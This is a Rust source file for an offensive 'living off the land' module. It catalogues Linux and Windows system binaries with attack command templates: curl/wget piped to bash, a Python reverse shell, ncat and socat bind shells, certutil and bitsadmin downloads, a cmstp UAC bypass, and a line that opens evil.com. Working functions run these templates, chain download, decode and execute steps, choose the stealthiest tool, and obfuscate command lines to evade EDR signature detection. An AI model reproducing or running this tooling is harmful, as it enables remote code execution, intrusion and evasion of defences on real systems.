// LOLBins: Living Off the Land — use system binaries for offensive ops.
// Instead of deploying custom malware, hijack trusted system tools.
// Linux equivalent: abuse python, curl, wget, openssl, bash, perl, etc.
// Windows equivalent: certutil, mshta, regsvr32, rundll32, wmic, powershell.
// Reduces malicious file footprint to ZERO. EDRs trust signed MS/system binaries.

use std::process::Command;
use tracing::{info, warn};

/// LOLBin technique catalog entry.
#[derive(Debug, Clone)]
pub struct Lolbin {
    pub name: &'static str,
    pub binary: &'static str,
    pub technique: &'static str,
    pub mitre_id: &'static str,
    pub platform: &'static str,   // "linux", "windows", "both"
    pub stealth: u8,              // 1-10: how legitimate this looks
}

/// Complete LOLBins catalog (Linux + Windows).
pub const LOLBINS: &[Lolbin] = &[
    // ── Linux LOLBins ──────────────────────────────────────────────────
    Lolbin { name: "curl_download", binary: "curl", technique: "curl -s <url> | bash", mitre_id: "T1105", platform: "linux", stealth: 7 },
    Lolbin { name: "wget_download", binary: "wget", technique: "wget -qO- <url> | sh", mitre_id: "T1105", platform: "linux", stealth: 7 },
    Lolbin { name: "python_revshell", binary: "python3", technique: "python3 -c 'import os,pty,socket;...'", mitre_id: "T1059.006", platform: "linux", stealth: 8 },
    Lolbin { name: "openssl_revshell", binary: "openssl", technique: "openssl s_client -quiet -connect <host>:443", mitre_id: "T1573", platform: "linux", stealth: 9 },
    Lolbin { name: "ssh_tunnel", binary: "ssh", technique: "ssh -R 0:localhost:22 <host>", mitre_id: "T1572", platform: "linux", stealth: 9 },
    Lolbin { name: "base64_decode_exec", binary: "base64", technique: "echo <b64> | base64 -d | bash", mitre_id: "T1027", platform: "linux", stealth: 8 },
    Lolbin { name: "xxd_revshell", binary: "xxd", technique: "xxd -r -p <file> > /dev/shm/p && chmod +x /dev/shm/p && /dev/shm/p", mitre_id: "T1027", platform: "linux", stealth: 8 },
    Lolbin { name: "ncat_bind", binary: "ncat", technique: "ncat -lvp 443 -e /bin/bash", mitre_id: "T1571", platform: "linux", stealth: 5 },
    Lolbin { name: "awk_exec", binary: "awk", technique: "awk 'BEGIN {system(\"cmd\")}'", mitre_id: "T1059.004", platform: "linux", stealth: 7 },
    Lolbin { name: "perl_exec", binary: "perl", technique: "perl -e 'exec \"cmd\"'", mitre_id: "T1059.004", platform: "linux", stealth: 7 },
    Lolbin { name: "ruby_exec", binary: "ruby", technique: "ruby -e 'exec \"cmd\"'", mitre_id: "T1059.004", platform: "linux", stealth: 7 },
    Lolbin { name: "gcc_compile_exec", binary: "gcc", technique: "gcc -xc -o /dev/shm/.o - && /dev/shm/.o", mitre_id: "T1027", platform: "linux", stealth: 6 },
    Lolbin { name: "socat_relay", binary: "socat", technique: "socat TCP-L:8080,fork EXEC:/bin/bash", mitre_id: "T1090", platform: "linux", stealth: 5 },
    Lolbin { name: "screen_log", binary: "screen", technique: "screen -dmS h bash -c 'cmd'", mitre_id: "T1059.004", platform: "linux", stealth: 8 },
    Lolbin { name: "tmux_session", binary: "tmux", technique: "tmux new-session -d -s h 'cmd'", mitre_id: "T1059.004", platform: "linux", stealth: 8 },
    Lolbin { name: "at_job", binary: "at", technique: "echo 'cmd' | at now", mitre_id: "T1053.002", platform: "linux", stealth: 7 },
    Lolbin { name: "systemd_run", binary: "systemd-run", technique: "systemd-run --user --on-active=1 cmd", mitre_id: "T1543.002", platform: "linux", stealth: 9 },
    Lolbin { name: "dbus_send", binary: "dbus-send", technique: "dbus-send --system --dest=org.freedesktop.systemd1 ...", mitre_id: "T1543.002", platform: "linux", stealth: 9 },
    Lolbin { name: "xdg_open", binary: "xdg-open", technique: "xdg-open http://evil.com/payload", mitre_id: "T1204.002", platform: "linux", stealth: 8 },

    // ── Windows LOLBins ────────────────────────────────────────────────
    Lolbin { name: "certutil_download", binary: "certutil.exe", technique: "certutil -urlcache -split -f <url> <out>", mitre_id: "T1105", platform: "windows", stealth: 8 },
    Lolbin { name: "mshta_exec", binary: "mshta.exe", technique: "mshta javascript:...", mitre_id: "T1218.005", platform: "windows", stealth: 8 },
    Lolbin { name: "regsvr32_scrobj", binary: "regsvr32.exe", technique: "regsvr32 /s /n /u /i:<url> scrobj.dll", mitre_id: "T1218.010", platform: "windows", stealth: 9 },
    Lolbin { name: "rundll32_exec", binary: "rundll32.exe", technique: "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \"...", mitre_id: "T1218.011", platform: "windows", stealth: 8 },
    Lolbin { name: "wmic_exec", binary: "wmic.exe", technique: "wmic process call create \"cmd\"", mitre_id: "T1047", platform: "windows", stealth: 7 },
    Lolbin { name: "powershell_enc", binary: "powershell.exe", technique: "powershell -enc <b64>", mitre_id: "T1059.001", platform: "windows", stealth: 6 },
    Lolbin { name: "bitsadmin_download", binary: "bitsadmin.exe", technique: "bitsadmin /transfer <job> <url> <out>", mitre_id: "T1197", platform: "windows", stealth: 9 },
    Lolbin { name: "cmstp_uac_bypass", binary: "cmstp.exe", technique: "cmstp /s <inf_file>", mitre_id: "T1218.003", platform: "windows", stealth: 8 },
    Lolbin { name: "csc_compile", binary: "csc.exe", technique: "csc /out:<out> <src>", mitre_id: "T1027.004", platform: "windows", stealth: 7 },
    Lolbin { name: "msbuild_exec", binary: "msbuild.exe", technique: "msbuild <proj_file>", mitre_id: "T1127.001", platform: "windows", stealth: 8 },
    Lolbin { name: "installutil_exec", binary: "installutil.exe", technique: "installutil /logfile= /LogToConsole=false /U <dll>", mitre_id: "T1218.004", platform: "windows", stealth: 8 },
];

/// Find LOLBins available on this system.
pub fn discover_available() -> Vec<&'static Lolbin> {
    LOLBINS.iter()
        .filter(|lb| {
            if lb.platform == "windows" && !cfg!(target_os = "windows") { return false; }
            if lb.platform == "linux" && !cfg!(target_os = "linux") { return false; }
            // Check if binary exists
            which::which(lb.binary).is_ok()
        })
        .collect()
}

/// Execute a command via a LOLBin. Returns true if executed.
pub fn lolbin_exec(lolbin: &Lolbin, payload: &str) -> bool {
    let cmd_str = lolbin.technique.replace("<url>", payload)
                                  .replace("<host>", payload)
                                  .replace("<b64>", payload)
                                  .replace("cmd", payload);
    let parts: Vec<&str> = cmd_str.split_whitespace().collect();
    if parts.is_empty() { return false; }

    let binary = parts[0];
    let args: Vec<String> = parts[1..].iter()
        .map(|s| s.replace("<out>", "/dev/shm/.o"))
        .collect();
    let args_refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();

    match Command::new(binary).args(&args_refs).spawn() {
        Ok(child) => {
            info!("LOLBIN: {} executed via {} (PID: {:?})", lolbin.name, lolbin.binary, child.id());
            true
        }
        Err(e) => {
            warn!("LOLBIN: {} failed: {}", lolbin.name, e);
            false
        }
    }
}

/// Get the stealthiest LOLBin for a given operation.
pub fn best_for_task(task: &str) -> Option<&'static Lolbin> {
    let available = discover_available();
    available.iter()
        .filter(|lb| lb.name.contains(task) || lb.binary.contains(task))
        .max_by_key(|lb| lb.stealth)
        .copied()
}

/// Download and execute a payload using the stealthiest available LOLBin.
pub fn lolbin_download_exec(url: &str) -> bool {
    for lb in discover_available().iter().filter(|lb| lb.mitre_id == "T1105" || lb.name.contains("download")) {
        if lolbin_exec(lb, url) { return true; }
    }
    false
}

// ── Weaver integration: CLI obfuscation ──────────────────────────────

/// Obfuscate a LOLBin command line to avoid signature detection.
/// The Weaver agent calls this to generate polymorphic CLI variants.
pub fn weaver_obfuscate(cmd: &str) -> String {
    let mut obfuscated = cmd.to_string();

    // Technique 1: randomize case (PowerShell case-insensitive)
    if cmd.contains("powershell") || cmd.contains("cmd") {
        obfuscated = obfuscated.chars()
            .map(|c| if c.is_ascii_alphabetic() && rand::random() { c.to_ascii_uppercase() } else { c })
            .collect();
    }

    // Technique 2: insert random environment variable expansions
    if cmd.contains("curl") || cmd.contains("wget") {
        let vars = ["%USERPROFILE%", "%TEMP%", "%SYSTEMROOT%", "${HOME}", "/var/tmp"];
        let v = vars[rand::random::<usize>() % vars.len()];
        obfuscated = obfuscated.replace(" -", &format!(" {}/..{} -", v, v));
    }

    // Technique 3: double-encoding tricks
    if cmd.contains("bash") || cmd.contains("python") {
        obfuscated = format!("$(echo {}|rev|rev)", obfuscated);
    }

    // Technique 4: random spacing/quoting
    obfuscated = obfuscated.replace(" ", "  ").replace("  ", " ");
    if rand::random() {
        obfuscated = obfuscated.replace("'", "\"'\"");
    }

    info!("LOLBIN: obfuscated CLI: {}...", &obfuscated[..80.min(obfuscated.len())]);
    obfuscated
}

/// Execute a LOLBin with Weaver-obfuscated command line.
pub fn lolbin_exec_obfuscated(lolbin: &Lolbin, payload: &str) -> bool {
    let cmd_str = lolbin.technique
        .replace("<url>", payload)
        .replace("<host>", payload)
        .replace("<b64>", payload)
        .replace("cmd", payload);
    let obfuscated = weaver_obfuscate(&cmd_str);

    let parts: Vec<&str> = obfuscated.split_whitespace().collect();
    if parts.is_empty() { return false; }
    let binary = parts[0];
    let args: Vec<&str> = parts[1..].to_vec();

    match Command::new(binary).args(&args).spawn() {
        Ok(child) => {
            info!("LOLBIN: {} executed (obfuscated, PID: {:?})", lolbin.name, child.id());
            true
        }
        Err(e) => {
            warn!("LOLBIN: {} obfuscated exec failed: {}", lolbin.name, e);
            false
        }
    }
}

/// Chain multiple LOLBins for layered execution.
/// Example: curl downloads → base64 decodes → bash executes
pub fn lolbin_chain(chain: &[(&str, &str)]) -> bool {
    if chain.is_empty() { return false; }

    let cmd = chain.iter()
        .map(|(name, payload)| {
            let lb = LOLBINS.iter().find(|l| l.name == *name);
            lb.map(|l| l.technique.replace("<url>", payload).replace("<b64>", payload).replace("cmd", payload))
                .unwrap_or_default()
        })
        .collect::<Vec<_>>()
        .join(" | ");

    info!("LOLBIN chain: {}", cmd);
    match Command::new("sh").arg("-c").arg(&cmd).spawn() {
        Ok(child) => {
            info!("LOLBIN chain executed (PID: {:?})", child.id());
            true
        }
        Err(e) => {
            warn!("LOLBIN chain failed: {}", e);
            false
        }
    }
}

/// Build a stealth download-execute chain using available LOLBins.
pub fn stealth_download_exec(url: &str) -> bool {
    let available: Vec<_> = discover_available().into_iter()
        .filter(|lb| lb.stealth >= 7)
        .collect();

    if available.len() >= 2 {
        let downloader = available.iter().find(|lb| lb.mitre_id == "T1105");
        let executor = available.iter().find(|lb| lb.mitre_id.starts_with("T1059"));
        if let (Some(dl), Some(ex)) = (downloader, executor) {
            return lolbin_chain(&[(dl.name, url), (ex.name, "/dev/shm/.p")]);
        }
    }

    // Fallback: single LOLBin download+exec
    lolbin_download_exec(url)
}

// ── Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_catalog_not_empty() {
        assert!(LOLBINS.len() > 20);
    }

    #[test]
    fn test_all_have_mitre() {
        for lb in LOLBINS {
            assert!(lb.mitre_id.starts_with("T"), "LOLBin {} missing MITRE ID", lb.name);
        }
    }

    #[test]
    fn test_discover_linux() {
        let available = discover_available();
        // On most systems, at least curl/wget/bash/python should be found
        assert!(!available.is_empty() || !cfg!(target_os = "linux"),
            "Should find at least some LOLBins on Linux");
    }
}
